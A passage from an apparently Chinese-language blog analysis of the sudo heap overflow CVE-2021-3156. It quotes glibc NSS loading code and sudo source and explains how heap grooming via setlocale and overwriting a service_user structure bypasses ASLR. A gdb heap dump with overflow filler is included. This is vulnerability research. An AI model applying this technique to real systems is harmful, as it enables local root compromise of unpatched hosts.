class="line"></span><br><span class="line">	  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == (<span class="keyword">void</span> *) <span class="number">-1l</span>)</span><br><span class="line">	    <span class="comment">/* Library not found =&gt; function not found.  */</span></span><br><span class="line">	    result = <span class="literal">NULL</span>;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/* Get the desired function.  */</span></span><br><span class="line">	      <span class="keyword">size_t</span> namlen = (<span class="number">5</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">1</span></span><br><span class="line">			       + <span class="built_in">strlen</span> (fct_name) + <span class="number">1</span>);</span><br><span class="line">	      <span class="keyword">char</span> name[namlen];</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Construct the function name.  */</span></span><br><span class="line">	      __stpcpy (__stpcpy (__stpcpy (__stpcpy (name, <span class="string">"_nss_"</span>),</span><br><span class="line">					    ni-&gt;name),</span><br><span class="line">				  <span class="string">"_"</span>),</span><br><span class="line">			fct_name);</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Look up the symbol.  */</span></span><br><span class="line">	      result = __libc_dlsym (ni-&gt;library-&gt;lib_handle, name);</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	  <span class="comment">/* We can't get function address dynamically in static linking. */</span></span><br><span class="line">	  &#123;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DEFINE_ENT(h,nm)						      \</span></span><br><span class="line">	    &#123; <span class="meta">#h<span class="meta-string">"_get"</span>#nm<span class="meta-string">"ent_r"</span>, _nss_##h##_get##nm##ent_r &#125;,		      \</span></span><br><span class="line">	    &#123; <span class="meta">#h<span class="meta-string">"_end"</span>#nm<span class="meta-string">"ent"</span>, _nss_##h##_end##nm##ent &#125;,		      \</span></span><br><span class="line">	    &#123; <span class="meta">#h<span class="meta-string">"_set"</span>#nm<span class="meta-string">"ent"</span>, _nss_##h##_set##nm##ent &#125;,</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DEFINE_GET(h,nm)						      \</span></span><br><span class="line">	    &#123; <span class="meta">#h<span class="meta-string">"_get"</span>#nm<span class="meta-string">"_r"</span>, _nss_##h##_get##nm##_r &#125;,</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DEFINE_GETBY(h,nm,ky)						      \</span></span><br><span class="line">	    &#123; <span class="meta">#h<span class="meta-string">"_get"</span>#nm<span class="meta-string">"by"</span>#ky<span class="meta-string">"_r"</span>, _nss_##h##_get##nm##by##ky##_r &#125;,</span></span><br><span class="line">	    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">fct_tbl</span> &#123;</span> <span class="keyword">const</span> <span class="keyword">char</span> *fname; <span class="keyword">void</span> *fp; &#125; *tp, tbl[] =</span><br><span class="line">	      &#123;</span><br><span class="line"># include <span class="string">"function.def"</span></span><br><span class="line">		&#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;</span><br><span class="line">	      &#125;;</span><br><span class="line">	    <span class="keyword">size_t</span> namlen = (<span class="number">5</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">1</span></span><br><span class="line">			     + <span class="built_in">strlen</span> (fct_name) + <span class="number">1</span>);</span><br><span class="line">	    <span class="keyword">char</span> name[namlen];</span><br><span class="line"></span><br><span class="line">	    <span class="comment">/* Construct the function name.  */</span></span><br><span class="line">	    __stpcpy (__stpcpy (__stpcpy (name, ni-&gt;name),</span><br><span class="line">				<span class="string">"_"</span>),</span><br><span class="line">		      fct_name);</span><br><span class="line"></span><br><span class="line">	    result = <span class="literal">NULL</span>;</span><br><span class="line">	    <span class="keyword">for</span> (tp = &amp;tbl[<span class="number">0</span>]; tp-&gt;fname; tp++)</span><br><span class="line">	      <span class="keyword">if</span> (<span class="built_in">strcmp</span> (tp-&gt;fname, name) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  result = tp-&gt;fp;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Remember function pointer for later calls.  Even if null, we</span></span><br><span class="line"><span class="comment">	     record it so a second try needn't search the library again.  */</span></span><br><span class="line">	  known-&gt;fct_ptr = result;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">	  PTR_MANGLE (known-&gt;fct_ptr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Remove the lock.  */</span></span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Load library.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">nss_load_library (service_user *ni)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment">	 library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment">	 is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment">	 holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment">	 default configuration.  */</span></span><br><span class="line">      <span class="keyword">static</span> name_database default_table;</span><br><span class="line">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line">				     ni-&gt;name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">		      + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line">					      <span class="string">"libnss_"</span>),</span><br><span class="line">				    ni-&gt;name),</span><br><span class="line">			  <span class="string">".so"</span>),</span><br><span class="line">		__nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Failed to load the library.  */</span></span><br><span class="line">	  ni-&gt;library-&gt;lib_handle = (<span class="keyword">void</span> *) <span class="number">-1l</span>;</span><br><span class="line">	  __set_errno (saved_errno);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> USE_NSCD</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (is_nscd)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Call the init function when nscd is used.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> initlen = (<span class="number">5</span> + <span class="built_in">strlen</span> (ni-&gt;name)</span><br><span class="line">			    + <span class="built_in">strlen</span> (<span class="string">"_init"</span>) + <span class="number">1</span>);</span><br><span class="line">	  <span class="keyword">char</span> init_name[initlen];</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Construct the init function name.  */</span></span><br><span class="line">	  __stpcpy (__stpcpy (__stpcpy (init_name,</span><br><span class="line">					<span class="string">"_nss_"</span>),</span><br><span class="line">			      ni-&gt;name),</span><br><span class="line">		    <span class="string">"_init"</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Find the optional init function.  */</span></span><br><span class="line">	  <span class="keyword">void</span> (*ifct) (<span class="keyword">void</span> (*) (<span class="keyword">size_t</span>, struct traced_file *))</span><br><span class="line">	    = __libc_dlsym (ni-&gt;library-&gt;lib_handle, init_name);</span><br><span class="line">	  <span class="keyword">if</span> (ifct != <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">void</span> (*cb) (<span class="keyword">size_t</span>, struct traced_file *) = nscd_init_cb;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cb);</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line">	      ifct (cb);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种利用方式使得我们可以绕过ASLR的限制，不过有一些实现的细节问题，首先是我们如何找到加载的<code>service_user</code>类型的数据，这个问题可以通过gdb搜索<code>systemd</code>字符串来确定。</p>
<p>其次是我们需要通过堆溢出覆写<code>nss_load_libray</code>的参数，这就要求我们可控的堆空间距离参数的距离最好要小一点，否则可能因为溢出到中间的关键数据结构导致程序crash。那么最好的方法就是我们人为地在存储<code>systemd</code>的数据结构前释放一个空闲堆块，并且在<code>user_args</code>申请时使其申请得到这样一个堆块，进而溢出伪造<code>service_user</code>。目前公开的exp是使用<code>setlocale</code>函数来进行的提前占位。到这里我们再来了解一下setlocale。</p>
<p>懒人直接粘贴manual page，这个函数是用来设置计算机的地址信息的，有很多参数可以选择，<code>LC_ALL</code>表示下面的全部选项都使用。使用系统默认的设置调用<code>setlocale(LC_ALL,&quot;&quot;);</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SYNOPSIS</span><br><span class="line">       <span class="comment">#include &lt;locale.h&gt;</span></span><br><span class="line"></span><br><span class="line">       char *setlocale(int category, const char *locale);</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The setlocale() <span class="keyword">function</span> is used to <span class="built_in">set</span> or query the pro‐</span><br><span class="line">       gram<span class="string">'s current locale.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       If locale is not NULL, the program'</span>s  current  locale  is</span><br><span class="line">       modified  according to the arguments.  The argument cate‐</span><br><span class="line">       gory determines <span class="built_in">which</span>  parts  of  the  program<span class="string">'s  current</span></span><br><span class="line"><span class="string">       locale should be modified.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Category            Governs</span></span><br><span class="line"><span class="string">       LC_ALL              All of the locale</span></span><br><span class="line"><span class="string">       LC_ADDRESS          Formatting of addresses and</span></span><br><span class="line"><span class="string">                           geography-related items (*)</span></span><br><span class="line"><span class="string">       LC_COLLATE          String collation</span></span><br><span class="line"><span class="string">       LC_CTYPE            Character classification</span></span><br><span class="line"><span class="string">       LC_IDENTIFICATION   Metadata describing the locale (*)</span></span><br><span class="line"><span class="string">       LC_MEASUREMENT      Settings related to measurements</span></span><br><span class="line"><span class="string">                           (metric versus US customary) (*)</span></span><br><span class="line"><span class="string">       LC_MESSAGES         Localizable natural-language messages</span></span><br><span class="line"><span class="string">       LC_MONETARY         Formatting of monetary values</span></span><br><span class="line"><span class="string">       LC_NAME             Formatting of salutations for persons (*)</span></span><br><span class="line"><span class="string">       LC_NUMERIC          Formatting of nonmonetary numeric values</span></span><br><span class="line"><span class="string">       LC_PAPER            Settings related to the standard paper size (*)</span></span><br><span class="line"><span class="string">       LC_TELEPHONE        Formats to be used with telephone services (*)</span></span><br><span class="line"><span class="string">       LC_TIME             Formatting of date and time values</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       The categories marked with an asterisk in the above table</span></span><br><span class="line"><span class="string">       are GNU extensions.  For  further  information  on  these</span></span><br><span class="line"><span class="string">       locale categories, see locale(7).</span></span><br></pre></td></tr></table></figure>
<p>在sudo的main函数的开头(154行)调用<code>setlocale(LC_ALL, &quot;&quot;);</code>从而使用系统的默认设置locale，在169行调用<code>if (sudo_conf_read(NULL, SUDO_CONF_DEBUG) == -1)</code>函数，在该函数中调用<code>strdup(prev_locale)</code>以及<code>free(prev_locale);</code>进行了堆块的分配释放，且位于sudo靠前的位置，<del>我们可以考虑在此处分配并释放特殊大小的堆块，为之后的<code>user_args</code>占位</del>，经过调试发现这里其实并不是在占位，而是改变堆块的布局结构，为分配到<code>user_args</code>铺垫。</p>
<p>下图为strdup调用</p>
<p><img src="/2021/02/04/cve-2021-3156/8.png" alt></p>
<p>下图为分配之后的堆布局</p>
<p><img src="/2021/02/04/cve-2021-3156/9.png" alt><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reads in /etc/sudo.conf and populates sudo_conf_data.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">sudo_conf_read_v1(<span class="keyword">const</span> <span class="keyword">char</span> *conf_file, <span class="keyword">int</span> conf_types)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span>;</span></span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> *prev_locale, *line = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> conf_lineno = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> linesize = <span class="number">0</span>;</span><br><span class="line">    debug_decl(sudo_conf_read, SUDO_DEBUG_UTIL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((prev_locale = setlocale(LC_ALL, <span class="literal">NULL</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	sudo_warn(<span class="string">"setlocale(LC_ALL, NULL)"</span>);</span><br><span class="line">	debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((prev_locale = strdup(prev_locale)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">	debug_return_int(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse sudo.conf in the "C" locale. */</span></span><br><span class="line">    <span class="keyword">if</span> (prev_locale[<span class="number">0</span>] != <span class="string">'C'</span> || prev_locale[<span class="number">1</span>] != <span class="string">'\0'</span>)</span><br><span class="line">        setlocale(LC_ALL, <span class="string">"C"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (conf_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	conf_file = _PATH_SUDO_CONF;</span><br><span class="line">	<span class="keyword">switch</span> (sudo_secure_file(conf_file, ROOT_UID, <span class="number">-1</span>, &amp;sb)) &#123;</span><br><span class="line">	    <span class="keyword">case</span> SUDO_PATH_SECURE:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> SUDO_PATH_MISSING:</span><br><span class="line">		<span class="comment">/* Root should always be able to read sudo.conf. */</span></span><br><span class="line">		<span class="keyword">if</span> (errno != ENOENT &amp;&amp; geteuid() == ROOT_UID)</span><br><span class="line">		    sudo_warn(U_(<span class="string">"unable to stat %s"</span>), conf_file);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	    <span class="keyword">case</span> SUDO_PATH_BAD_TYPE:</span><br><span class="line">		sudo_warnx(U_(<span class="string">"%s is not a regular file"</span>), conf_file);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	    <span class="keyword">case</span> SUDO_PATH_WRONG_OWNER:</span><br><span class="line">		sudo_warnx(U_(<span class="string">"%s is owned by uid %u, should be %u"</span>),</span><br><span class="line">		    conf_file, (<span class="keyword">unsigned</span> <span class="keyword">int</span>) sb.st_uid, ROOT_UID);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	    <span class="keyword">case</span> SUDO_PATH_WORLD_WRITABLE:</span><br><span class="line">		sudo_warnx(U_(<span class="string">"%s is world writable"</span>), conf_file);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	    <span class="keyword">case</span> SUDO_PATH_GROUP_WRITABLE:</span><br><span class="line">		sudo_warnx(U_(<span class="string">"%s is group writable"</span>), conf_file);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	    <span class="keyword">default</span>:</span><br><span class="line">		<span class="comment">/* NOTREACHED */</span></span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(conf_file, <span class="string">"r"</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (errno != ENOENT &amp;&amp; geteuid() == ROOT_UID)</span><br><span class="line">	    sudo_warn(U_(<span class="string">"unable to open %s"</span>), conf_file);</span><br><span class="line">	<span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (sudo_parseln(&amp;line, &amp;linesize, &amp;conf_lineno, fp, <span class="number">0</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sudo_conf_table</span> *<span class="title">cur</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> *cp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*(cp = line) == <span class="string">'\0'</span>)</span><br><span class="line">	    <span class="keyword">continue</span>;		<span class="comment">/* empty line or comment */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>, cur = sudo_conf_table; cur-&gt;name != <span class="literal">NULL</span>; i++, cur++) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (strncasecmp(cp, cur-&gt;name, cur-&gt;namelen) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">		isblank((<span class="keyword">unsigned</span> <span class="keyword">char</span>)cp[cur-&gt;namelen])) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ISSET(conf_types, (<span class="number">1</span> &lt;&lt; i))) &#123;</span><br><span class="line">		    cp += cur-&gt;namelen;</span><br><span class="line">		    <span class="keyword">while</span> (isblank((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*cp))</span><br><span class="line">			cp++;</span><br><span class="line">		    ret = cur-&gt;parser(cp, conf_file, conf_lineno);</span><br><span class="line">		    <span class="keyword">if</span> (ret == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">goto</span> done;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (cur-&gt;name == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	    sudo_debug_printf(SUDO_DEBUG_WARN,</span><br><span class="line">		<span class="string">"%s: %s:%u: unsupported entry: %s"</span>, __func__, conf_file,</span><br><span class="line">		conf_lineno, line);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">	fclose(fp);</span><br><span class="line">    <span class="built_in">free</span>(line);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Restore locale if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (prev_locale[<span class="number">0</span>] != <span class="string">'C'</span> || prev_locale[<span class="number">1</span>] != <span class="string">'\0'</span>)</span><br><span class="line">        setlocale(LC_ALL, prev_locale);</span><br><span class="line">    <span class="built_in">free</span>(prev_locale);</span><br><span class="line">    debug_return_int(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在sudo main函数的191行调用了<code>get_user_info(&amp;user_details)</code>函数，进而通过<code>getpwuid</code>调用到<code>__getpwuid_r</code>，最终初始化了<code>systemd</code>的<code>service_user</code>结构.因为本地没有符号，我是拿IDA反编译sudo手动定位到的</p>
<p><img src="/2021/02/04/cve-2021-3156/10.png" alt></p>
<p><img src="/2021/02/04/cve-2021-3156/11.png" alt><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Return user information as an array of name=value pairs.</span></span><br><span class="line"><span class="comment"> * and fill in struct user_details (which shares the same strings).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> **</span><br><span class="line">get_user_info(struct user_details *ud)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *cp, **user_info, path[PATH_MAX];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">mode_t</span> mask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    debug_decl(get_user_info, SUDO_DEBUG_UTIL)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On BSD systems you can set a hint to keep the password and</span></span><br><span class="line"><span class="comment">     * group databases open instead of having to open and close</span></span><br><span class="line"><span class="comment">     * them all the time.  Since sudo does a lot of password and</span></span><br><span class="line"><span class="comment">     * group lookups, keeping the file open can speed things up.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SETPASSENT</span></span><br><span class="line">    setpassent(<span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_SETPASSENT */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SETGROUPENT</span></span><br><span class="line">    setgroupent(<span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_SETGROUPENT */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ud, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ud));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX - bound check number of entries */</span></span><br><span class="line">    user_info = reallocarray(<span class="literal">NULL</span>, <span class="number">32</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">    <span class="keyword">if</span> (user_info == <span class="literal">NULL</span>)</span><br><span class="line">	<span class="keyword">goto</span> oom;</span><br><span class="line"></span><br><span class="line">    ud-&gt;pid = getpid();</span><br><span class="line">    ud-&gt;ppid = getppid();</span><br><span class="line">    ud-&gt;pgid = getpgid(<span class="number">0</span>);</span><br><span class="line">    ud-&gt;tcpgid = <span class="number">-1</span>;</span><br><span class="line">    fd = open(_PATH_TTY, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd != <span class="number">-1</span>) &#123;</span><br><span class="line">	ud-&gt;tcpgid = tcgetpgrp(fd);</span><br><span class="line">	close(fd);</span><br><span class="line">    &#125;</span><br><span class="line">    ud-&gt;sid = getsid(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ud-&gt;uid = getuid();</span><br><span class="line">    ud-&gt;euid = geteuid();</span><br><span class="line">    ud-&gt;gid = getgid();</span><br><span class="line">    ud-&gt;egid = getegid();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SETAUTHDB</span></span><br><span class="line">    aix_setauthdb(IDtouser(ud-&gt;uid), <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    pw = getpwuid(ud-&gt;uid);</span><br><span class="line">	<span class="comment">//..</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *pwfile = <span class="string">"/etc/passwd"</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *</span></span><br><span class="line"><span class="class"><span class="title">getpwuid</span>(<span class="title">uid_t</span> <span class="title">uid</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pwf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> ((pwf = fopen(pwfile, <span class="string">"r"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">	    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	(<span class="keyword">void</span>)fcntl(fileno(pwf), F_SETFD, FD_CLOEXEC);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	rewind(pwf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pw = getpwent()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (pw-&gt;pw_uid == uid)</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!pw_stayopen) &#123;</span><br><span class="line">	fclose(pwf);</span><br><span class="line">	pwf = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pw;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>经过一系列的分配释放我们终于在目标地址的上方构造出了一个空闲堆块，通过查看堆上的脏数据可以判定该堆块是在nsswitch的时候用到的一个临时堆块，释放之后恰好在存储<code>systemd</code>这个共享库的上方。</p>
<p>最后我打印了一下构造好的堆布局</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">180</span>gx <span class="number">0x555555783ea0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555783e90</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000000f1</span></span><br><span class="line"><span class="number">0x555555783ea0</span>: <span class="number">0x40382d4654552e43</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783eb0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783ec0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783ed0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783ee0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783ef0</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783f00</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783f10</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783f20</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783f30</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783f40</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783f50</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783f60</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x555555783f70</span>: <span class="number">0x4343434343434343</span>      <span class="number">0x0000000043434343</span></span><br><span class="line"><span class="number">0x555555783f80</span>: <span class="number">0x00000000000000f0</span>      <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555783f90</span>: <span class="number">0x000000006f647573</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555783fa0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555783fb0</span>: <span class="number">0x636f6c2f6374652f</span>      <span class="number">0x0000656d69746c61</span></span><br><span class="line"><span class="number">0x555555783fc0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555783fd0</span>: <span class="number">0x0000555555783ff0</span>      <span class="number">0x0000000000000003</span></span><br><span class="line"><span class="number">0x555555783fe0</span>: <span class="number">0x0000555500544d4c</span>      <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555783ff0</span>: <span class="number">0x0000555555784010</span>      <span class="number">0x0000000000000003</span></span><br><span 